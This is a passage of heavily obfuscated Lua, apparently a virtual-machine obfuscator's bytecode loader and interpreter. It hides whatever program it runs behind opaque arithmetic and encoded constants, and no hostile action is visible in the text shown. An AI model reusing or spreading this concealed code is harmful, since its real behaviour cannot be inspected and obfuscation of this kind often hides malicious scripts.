bw=bw+ct if(bw==ct or bw<ct)then cx=(cx-bz)%by else if not(bw~=cs)then return cz(cy(da,cy,cy,(cz and da)),da(cz,cz,cy,(da and db)),da(cy,db,cy,da),(cy(da,(db and cz),cz and da,cy)and cy((da and db),da and cy,db,da)))else break end end end else local bw=cv while true do bw=bw+ct if not(bw~=cs)then break else return cy end end end return cz end,function(bw,by,ca,cc)if cw>bs then local bs=cv while true do bs=bs+ct if not(bs~=cs)then break else return bw end end end cw=cw+ct cx=((cx-bj)%bk)if((cx%bh)==bi or(cx%bh)>bi)then local bh=cv while true do bh=bh+ct if(bh==cs or bh>cs)then if(bh<bg)then return ca else break end else cx=(cx*bf)%y end end else local y=cv while true do y=(y+ct)if(y<cs)then return bw(by(cc and by,bw and by,(ca and bw),bw),(cc(by,cc,by,(ca and cc))and ca(ca,cc,ca,ca)),ca(cc,bw and cc,bw,cc)and by(bw,bw and bw,ca,by),ca(ca,cc,(by and cc),ca))else break end end end return bw(ca(ca,by,ca and bw,cc),cc(ca,ca,cc,bw),bw(cc,cc,by,bw),by(bw,(bw and bw),ca,cc))end,function(y,bf,bh,bi)if(cw>be)then local be=cv while true do be=be+ct if be<cs then return bi else break end end end cw=cw+ct cx=((cx+x)%w)if((cx%s)>v or(cx%s)==v)then local s=cv while true do s=(s+ct)if(s<ct or s==ct)then cx=((cx-bz)%q)else if not(s~=bg)then break else return bi end end end else local q=cv while true do q=(q+ct)if not(q~=cs)then break else return bh(y(bh,(y and bh),bf,bi),(bi(bh,y,bf,bh)and bf(bi,bi and bh,bf,bh and bi)),bh(bf,bh,y,bh),bf(bf,bi,bf,bf))end end end return y(bh(bf and bi,bf,bf and y,(bi and bh)),bi(y,bh,bi,bh),bi(bi and bh,(bh and bh),bf,bh),y(bh,bi,bf,bi))end,function(q,s,v,w)if cw>p then local p=cv while true do p=p+ct if p<cs then return w else break end end end cw=cw+ct cx=(cx*d)%c if((cx%b)>a)then local a=cv while true do a=a+ct if(a<cs)then return q(v(w,q,q,(s and v)),q(q,v,s,(s and q))and w(s,w,w,s),s(q,w,q,(v and q)),v(q,v,q,v)and q(s,v,q,(q and w)))else break end end else local a=cv while true do a=a+ct if not(a~=cs)then break else return s end end end return w end)return cx;end)()));end else if bd<=29 then cl="\46"else if 30<bd then cn=cf else cm=function()local a,b,c=0 while true do if a<=1 then if 1~=a then b,c=h(bn,br,br+2)else b,c=bu(b,cb),bu(c,cb);end else if a<=2 then br=(br+2);else if a<4 then return((bv(c,8))+b);else break end end end a=a+1 end end end end end else if bd<=33 then if bd~=33 then co=function()local a,b,c,d,p=0 while true do if a<=2 then if a<=0 then b=g else if 1==a then c=157 else d=0 end end else if a<=3 then p={}else if a<5 then while d<8 do d=d+1;while d<707 and(c%1622<811)do c=(((c*35)))local q=(d+c)if((c%16522)<8261)then c=((c*19))while(((d<828)and c%658<329))do c=((c+60))local q=(d+c)if(((c%18428))==9214 or(((c%18428))<9214))then c=(((c-50)))local q=10701 if not p[q]then p[q]=1;local q,s=cn(),g;if not(q~=0)then return g;end;b=j(bn,br,(((br+q)-1)));br=(br+q);return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s==1 then while true do if 0<v then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif(c%4~=0)then c=((c-67))local q=33140 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s<2 then while true do if(v~=1)then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end else c=(c*88)d=(d+1)local q=92657 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s<2 then while true do if 1>v then return i(h(q))else break end v=(v+1)end else break end end s=s+1 end end);end end;d=(d+1);end elseif not(not(c%4~=0))then c=((c-48))while((d<859)and(c%1392<696))do c=((c*39))local q=((d+c))if((c%58)<29)then c=(((c+5)))local q=33930 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1<s then break else while true do if v>0 then break else return i(h(q))end v=v+1 end end end s=s+1 end end);end elseif not((c%4==0))then c=(c*56)local q=35370 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1<s then break else while true do if v>0 then break else return i(h(q))end v=v+1 end end end s=s+1 end end);end else c=((c*9))d=(d+1)local q=96267 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s~=2 then while true do if(1~=v)then return i(h(q))else break end v=(v+1)end else break end end s=s+1 end end);end end;d=(d+1);end else c=(((c-51)))d=(d+1)while(d<663)and((c%936)<468)do c=((c*12))local q=((d+c))if((c%18532)>=9266)then c=(c*71)local q=7037 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1==s then while true do if(v>0)then break else return i(h(q))end v=(v+1)end else break end end s=s+1 end end);end elseif not((c%4==0))then c=((c-18))local q=90882 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1==s then while true do if not(1==v)then return i(h(q))else break end v=(v+1)end else break end end s=s+1 end end);end else c=(c*35)d=(d+1)local q=41573 if not p[q]then p[q]=1;return z(b,cl,function(b)local p,q=0 while true do if p<=0 then q=0 else if 1==p then while true do if not(q~=0)then return i(h(b))else break end q=q+1 end else break end end p=p+1 end end);end end;d=d+1;end end;d=d+1;end c=(c-494)if((d>43))then break;end;end;else break end end end a=a+1 end end else cp=cf end else if bd<=34 then cq=function(...)local a=0 while true do if a>0 then break else return{...},n("\35",...)end a=a+1 end end else if bd==35 then cr=function()local a,b,c,d,p,q,s,v,w,x=0 while true do if a<=9 then if a<=4 then if a<=1 then if a<1 then b,c,d,p={},{},{},{}else q=m({[ch]=b,nil,[ci]=c,nil,[776]=p,[345]=bb,[536]=nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return j(bn,br,br);end,})end else if a<=2 then s={}else if 3==a then v=490 else w=0 end end end else if a<=6 then if a>5 then while w<3 do w=(w+1);while((w<481)and(v%320)<160)do v=(v*62)local d=(w+v)if(v%916)>458 then v=((v-88))while((w<318))and v%702<351 do v=((v*8))local d=((w+v))if((v%14064)>7032)then v=((v*81))local d=58084 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not((v%4)==0)then v=(v*37)local d=93269 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+10))w=(w+1)local d=78058 if not x[d]then x[d]=1;for d=1,cf()do local j=cg();if(not(j~=2))then s[d]=nil;elseif(not(j~=3))then s[d]=(not(cg()==0));elseif((j==0))then s[d]=ck();elseif(not((j~=1)))then s[d]=co();end;end;q[cj]=s;end end;w=w+1;end elseif not((v%4)==0)then v=((v*65))while(w<615 and v%618<309)do v=(v-33)local d=(w+v)if((v%15582)>7791)then v=((v*14))local d=31092 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not(v%4==0)then v=(((v+51)))local d=68285 if not x[d]then x[d]=1;s[cf()]=nil;end else v=(((v+53)))w=(w+1)local d=64266 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=(w+1);end else v=(v+7)w=w+1 while((w<127 and v%1548<774))do v=(v-37)local d=((w+v))if(((v%19188)>9594))then v=(((v*61)))local d=73351 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not((v%4==0))then v=(v+25)local d=78934 if not x[d]then x[d]=1;s[cf()]=nil;end else v=(((v+42)))w=((w+1))local d=62692 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=((w+1));end end;w=(w+1);end v=(v*482)if(w>56)then break;end;end;else x={}end else if a<=7 then for d=1,cf()do c[(d-1)]=cr();end;else if 8==a then q[481]=cg();else v=147 end end end end else if a<=14 then if a<=11 then if a==10 then w=0 else x={}end else if a<=12 then while(w<1)do w=(w+1);while((w<699)and(v%1668)<834)do v=((v+35))local c=w+v if(((v%616)>308))then v=(((v-2)))while w<52 and v%1410<705 do v=((v*72))local c=(w+v)if((v%13806)>6903)then v=((v*83))local c=69726 if not x[c]then x[c]=1;end elseif v%4~=0 then v=((v*20))local c=89910 if not x[c]then x[c]=1;end else v=((v-42))w=(w+1)local c=64274 if not x[c]then x[c]=1;end end;w=((w+1));end elseif(not((v%4)==0))then v=(v*33)while((w<449)and(v%972<486))do v=(v*32)local c=((w+v))if((((v%16906))==8453 or((v%16906))>8453))then v=((v+68))local c=43319 if not x[c]then x[c]=1;end elseif v%4~=0 then v=((v*82))local c=58787 if not x[c]then x[c]=1;end else v=(((v*67)))w=w+1 local c=51757 if not x[c]then x[c]=1;local c=1;local d=2;local j=3;local p=4;for p=1,cf()do local y=cg();local bb=cd(y,c,c);if(not(not((bb==0))))then local y,bb,be=cd(y,d,j),cd(y,4,6),m({[828]=cm(),[684]=cm(),nil,nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return cd(y,d,j);end,})if((y==0)or(y==c))then be[897]=cf();if(not(((y~=0))))then be[404]=cf();end;elseif(not((y~=d)))or(not(y~=j))then be[897]=((cf()-(e)));if(not(y~=j))then be[404]=cm();end;end;if(not(not((cd(bb,c,c)==c))))then be[684]=s[be[684]];end;if((not(cd(bb,d,d)~=c)))then be[897]=s[be[897]];end;if((((cd(bb,j,j)==c))))then be[404]=s[be[404]];end;b[p]=be;end;end;end end;w=w+1;end else v=(v*20)w=(w+1)while(w<56 and v%218<109)do v=((v+47))local b=(w+v)if((((v%4818))>2409))then v=((v-94))local b=37415 if not x[b]then x[b]=1;end elseif not((v%4==0))then v=(v-61)local b=7175 if not x[b]then x[b]=1;end else v=((v*57))w=(w+1)local b=99555 if not x[b]then x[b]=1;end end;w=((w+1));end end;w=(w+1);end v=(v+45)if(w>60)then break;end;end;else if 13<a then v=835 else do for b=1,#q[ch]do local b=q[ch][b]local c,d,e=b[684],b[897],b[404]if(not(bp(c)~=f))then c=z(c,cl,function(j,p,p)local p,s=0 while true do if p<=0 then s=0 else if 1<p then break else while true do if s==0 then return i(bu(h(j),cb))else break end s=s+1 end end end p=p+1 end end)b[684]=c end if bp(d)==f then d=z(d,cl,function(c,j,j)local j,p=0 while true do if j<=0 then p=0 else if 1<j then break else while true do if(1>p)then return i(bu(h(c),cb))else break end p=(p+1)end end end j=j+1 end end)b[897]=d end if(not((bp(e)~=f)))then e=z(e,cl,function(c,d)local d,j=0 while true do if d<=0 then j=0 else if d==1 then while true do if not(1==j)then return i(bu(h(c),cb))else break end j=j+1 end else break end end d=d+1 end end)b[404]=e end;end;q[cj]=nil;end;end end end else if a<=16 then if a==15 then w=0 else x={}end else if a<=17 then while w<4 do w=((w+1));while((w<936)and((v%398<199)))do v=(((v*45)))local b=(w+v)if(((((v%14564))>7282)or(((v%14564))==7282)))then v=(((v*25)))while(w<318)and((v%1966)<983)do v=((v*67))local b=(w+v)if(((v%9616))==4808 or((v%9616))<4808)then v=(((v-59)))local b=58132 if not x[b]then x[b]=1;return q end elseif not(v%4==0)then v=((v*73))local b=69253 if not x[b]then x[b]=1;return q end else v=(v-56)w=((w+1))local b=30607 if not x[b]then x[b]=1;return q end end;w=w+1;end elseif not((v%4==0))then v=((v*96))while((w<504 and v%1818<909))do v=(v-29)local b=(w+v)if((((v%5628))>2814 or(((v%5628))==2814)))then v=(((v-14)))local b=9201 if not x[b]then x[b]=1;end elseif not(not(v%4~=0))then v=((v+11))local b=62910 if not x[b]then x[b]=1;q[536]=function(...)local b,c,d,e,h=0 while true do if b<=0 then c,d,e,h=0 else if b~=2 then while true do if(c<=2)then if(c<0 or c==0)then d=n(1,...)else if(c~=2)then e=({...})else do for d=0,#e do if(not(bp(e[d])~=bq))then for i,i in o,e[d]do if not(bp(i)~=bp(g))then t(bo,i)end end else t(bo,e[d])end end end end end else if(c<=3)then h=function(d)local i,j,p=0 while true do if i<=0 then j,p=0 else if 2>i then while true do if(j==1 or j<1)then if 1>j then p=u(d)else for p=0,#bo do if ba(d,bo[p])then return bm(f);end end end else if j>2 then break else return false end end j=(j+1)end else break end end i=i+1 end end else if(c<5)then for d=0,#e do if(bp(e[d])==bq)then return h(e[d])end end else break end end end c=c+1 end else break end end b=b+1 end end end else v=((v*87))w=((w+1))local b=39506 if not x[b]then x[b]=1;return q end end;w=(w+1);end else v=((v+49))w=(w+1)while w<848 and v%1160<580 do v=(((v-68)))local b=w+v if((not(((v%5288))~=2644)or(((v%5288))>2644)))then v=(v-69)local b=45378 if not x[b]then x[b]=1;return q end elseif not(((v%4)==0))then v=(((v-44)))local b=27850 if not x[b]then x[b]=1;return q end else v=(((v+67)))w=(w+1)local b=66125 if not x[b]then x[b]=1;return q end end;w=(w+1);end end;w=w+1;end v=(((v*120)))if w>75 then break;end;end;else if 18<a then break else return q;end end end end end a=a+1 end end else break end end end end end end bd=bd+1 end local function a(b,c)local d if bp(l)==bq then d=l;else d=l(bl);end local e={}for f,h in o,d do if h~=b then e[f]=h else e[f]=c;end end if bc then return bc(bl,e)else l=e;return l;end end;local function b(...)local c=n(bl,...);local d=c[ci];local e=c[536];local f=c[ch];local h=n(2,...);local i=c[345];local j=n(3,...);local o=c[481];local c=c[776];local c=bt[ba(bx,i)];return function(...)local i,n,p,q,s,u,v,w=cq,1,-1,{},{...},(n("\35",...)-1),{},{};for x=0,u,1 do if(x>=o)then q[x-o]=s[x+1];else w[x]=s[x+1];end;end;local x,y,z,ba=(u-o+1),nil,nil,{};while true do y=f[n];z=y[828];if z<=192 then if z<=95 then if z<=47 then if z<=23 then if z<=11 then if z<=5 then if 2>=z then if z<=0 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;elseif 2>z then local ba;local bb;w={};for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];bb=y[684];ba=w[y[897]];w[bb+1]=ba;w[bb]=ba[y[404]];else w[y[684]]=b(d[y[897]],nil,j);end;elseif 3>=z then local ba;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))elseif z>4 then local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=false;n=n+1;y=f[n];ba=y[684]w[ba](w[ba+1])else local ba;local bb;local bc;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];bc=y[684]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[404]do ba=ba+1;w[bd]=bb[ba];end end;elseif 8>=z then if 6>=z then local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w={};else if 2>ba then for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;else n=n+1;end end else if ba<=4 then if ba>3 then w[y[684]]=j[y[897]];else y=f[n];end else if ba==5 then n=n+1;else y=f[n];end end end else if ba<=10 then if ba<=8 then if ba==7 then w[y[684]]=w[y[897]];else n=n+1;end else if 10~=ba then y=f[n];else for bb=y[684],y[897],1 do w[bb]=nil;end;end end else if ba<=12 then if 12>ba then n=n+1;else y=f[n];end else if 14~=ba then n=y[897];else break end end end end ba=ba+1 end elseif 7<z then w[y[684]]={};else local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]]*y[404];n=n+1;y=f[n];w[y[684]]=w[y[897]]+w[y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]]+w[y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))end;elseif z<=9 then w[y[684]]=w[y[897]]-y[404];elseif 11>z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];if w[y[684]]then n=n+1;else n=y[897];end;else w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];if(w[y[684]]~=w[y[404]])then n=n+1;else n=y[897];end;end;elseif 17>=z then if z<=14 then if z<=12 then local ba=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 1>ba then w[y[684]]=w[y[897]][y[404]];else n=n+1;end else if 2<ba then w[y[684]][y[897]]=w[y[404]];else y=f[n];end end else if ba<=5 then if ba==4 then n=n+1;else y=f[n];end else if ba~=7 then w[y[684]]=h[y[897]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if ba>8 then w[y[684]]=w[y[897]][y[404]];else y=f[n];end else if ba>10 then y=f[n];else n=n+1;end end else if ba<=13 then if 12<ba then n=n+1;else w[y[684]][y[897]]=w[y[404]];end else if ba<=14 then y=f[n];else if ba<16 then do return w[y[684]]end else break end end end end end ba=ba+1 end elseif 14~=z then local ba;local bb;local bc;w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];bc=y[684]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[404]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](w[ba+1])end;elseif z<=15 then local ba;local bb;w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]={r({},1,y[897])};n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];bb=y[684];ba=w[bb];for bc=bb+1,y[897]do t(ba,w[bc])end;elseif 16<z then local ba;local bb;local bc;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];bc=y[684]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[404]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](w[ba+1])end;elseif z<=20 then if z<=18 then local ba;local bb;local bc;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];bc=y[684]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[404]do ba=ba+1;w[bd]=bb[ba];end elseif z<20 then local ba=y[684];do return w[ba],w[ba+1]end else local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba]()end;elseif 21>=z then local ba;w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))elseif z<23 then w[y[684]]=w[y[897]]%y[404];else local ba=y[684];do return r(w,ba,p)end;end;elseif 35>=z then if z<=29 then if z<=26 then if 24>=z then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 0==ba then bb=nil else w[y[684]]=w[y[897]][y[404]];end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if ba<5 then w[y[684]]=y[897];else n=n+1;end else if ba<7 then y=f[n];else w[y[684]]=y[897];end end end else if ba<=11 then if ba<=9 then if 9~=ba then n=n+1;else y=f[n];end else if ba~=11 then w[y[684]]=y[897];else n=n+1;end end else if ba<=13 then if ba<13 then y=f[n];else bb=y[684]end else if ba==14 then w[bb]=w[bb](r(w,bb+1,y[897]))else break end end end end ba=ba+1 end elseif 25<z then local ba;local bb;w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]={r({},1,y[897])};n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];bb=y[684];ba=w[bb];for bc=bb+1,y[897]do t(ba,w[bc])end;else local ba=y[684];local bb=w[ba];for bc=ba+1,p do t(bb,w[bc])end;end;elseif z<=27 then local ba;local bb;w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]={r({},1,y[897])};n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];bb=y[684];ba=w[bb];for bc=bb+1,y[897]do t(ba,w[bc])end;elseif 28==z then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))else local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))end;elseif 32>=z then if 30>=z then local ba=0 while true do if ba<=14 then if ba<=6 then if ba<=2 then if ba<=0 then w={};else if 1<ba then n=n+1;else for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;end end else if ba<=4 then if ba~=4 then y=f[n];else w[y[684]]=h[y[897]];end else if ba>5 then y=f[n];else n=n+1;end end end else if ba<=10 then if ba<=8 then if 7==ba then w[y[684]]=w[y[897]][y[404]];else n=n+1;end else if ba>9 then w[y[684]]=h[y[897]];else y=f[n];end end else if ba<=12 then if ba~=12 then n=n+1;else y=f[n];end else if ba<14 then w[y[684]]={};else n=n+1;end end end end else if ba<=21 then if ba<=17 then if ba<=15 then y=f[n];else if 16<ba then n=n+1;else w[y[684]]={};end end else if ba<=19 then if 19~=ba then y=f[n];else w[y[684]][y[897]]=w[y[404]];end else if ba==20 then n=n+1;else y=f[n];end end end else if ba<=25 then if ba<=23 then if ba<23 then w[y[684]]=j[y[897]];else n=n+1;end else if 25~=ba then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end else if ba<=27 then if 27~=ba then n=n+1;else y=f[n];end else if ba~=29 then if w[y[684]]then n=n+1;else n=y[897];end;else break end end end end end ba=ba+1 end elseif 31==z then for ba=y[684],y[897],1 do w[ba]=nil;end;else local ba=y[684];local bb=w[y[897]];w[(ba+1)]=bb;w[ba]=bb[w[y[404]]];end;elseif z<=33 then if(w[y[684]]~=y[404])then n=y[897];else n=n+1;end;elseif z~=35 then local ba;w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))else local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]]*y[404];n=n+1;y=f[n];w[y[684]]=w[y[897]]+w[y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]]+w[y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))end;elseif 41>=z then if(38>z or 38==z)then if(z<36 or not(z~=36))then local ba=y[684]w[ba]=w[ba](w[(ba+1)])elseif(z<38)then h[y[897]]=w[y[684]];else j[y[897]]=w[y[684]];end;elseif(z<=39)then local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if 1~=ba then bb=nil else w[y[684]]=j[y[897]];end else if ba<=2 then n=n+1;else if 3<ba then w[y[684]]=w[y[897]][y[404]];else y=f[n];end end end else if ba<=7 then if ba<=5 then n=n+1;else if ba<7 then y=f[n];else w[y[684]]=y[897];end end else if ba<=8 then n=n+1;else if 9<ba then w[y[684]]=y[897];else y=f[n];end end end end else if ba<=15 then if ba<=12 then if ba~=12 then n=n+1;else y=f[n];end else if ba<=13 then w[y[684]]=y[897];else if 14<ba then y=f[n];else n=n+1;end end end else if ba<=18 then if ba<=16 then w[y[684]]=y[897];else if 18~=ba then n=n+1;else y=f[n];end end else if ba<=19 then bb=y[684]else if ba~=21 then w[bb]=w[bb](r(w,bb+1,y[897]))else break end end end end end ba=ba+1 end elseif(41~=z)then w[y[684]]=w[y[897]][w[y[404]]];else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba~=1 then bb=nil else w[y[684]]=w[y[897]][y[404]];end else if 3~=ba then n=n+1;else y=f[n];end end else if ba<=5 then if ba==4 then w[y[684]]=w[y[897]][y[404]];else n=n+1;end else if 6<ba then w[y[684]]=h[y[897]];else y=f[n];end end end else if ba<=11 then if ba<=9 then if 9>ba then n=n+1;else y=f[n];end else if 